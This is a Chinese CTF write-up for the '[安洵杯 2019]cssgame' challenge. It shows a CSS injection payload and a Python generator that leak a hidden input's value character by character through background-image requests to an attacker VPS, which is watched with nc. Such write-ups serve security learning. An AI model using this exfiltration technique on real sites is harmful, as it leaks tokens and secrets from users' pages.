---
title: "[安洵杯 2019]cssgame"
date: 2020-04-17
tags: [CTF, WP,CSS injection]
categories:
- [CTF, WP]
comments: false
---

# [安洵杯 2019]cssgame

## 分析

很有意思的CSS injection

大致的思路就是通过传入一个外部链接的css,让flag.html解析,

外部链接的css写入如下内容

<!-- more -->

```
input[name=flag][value^="f"] ~ * {background-image: url("http://x.x.x.x/?flag=f");}
```

然后对flag值进行逐位判断，如果正确则发送数据给vps

## payload

**exp**

```
import sys

f = open("poc.css", "w")
dic = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-"
for i in dic:
    flag = sys.argv[1] + i
    payload = "input[name=flag][value^=\"" + flag + "\"] ~ * {background-image: url(\"http://174.0.31.242:8080/?" + flag + "\");}"
    f.write(payload + "\n")
f.close()
```

在buu申请一台小号linux lab,然后在/var/www/html/目录写入以上exp,运行一下脚本,nc开启监听

然后就开始将`css=http://174.0.31.242/poc.css`post给`crawl.html`,在nc监听中可以得到flag,然后手动改flag的值,生成不同的poc.css,逐位爆破可以得到flag

[![mark](https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim)](https://blogjpg.yanmy.top/blog/20200417/7xPSKY9xQYDl.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim)](https://blogjpg.yanmy.top/blog/20200417/pBpeVx5eKtNN.png?imageslim)

## 总结

以上方法还是有点麻烦的，看看官方wp，发现有更好的办法，学一手，INS

## Reference

[[安洵杯 2019\]cssgame wp](https://nikoeurus.github.io/2019/11/30/2019安询杯-Web/#cssgame)

[[安洵杯 2019\]cssgame 官方WP](https://xz.aliyun.com/t/6911#toc-12)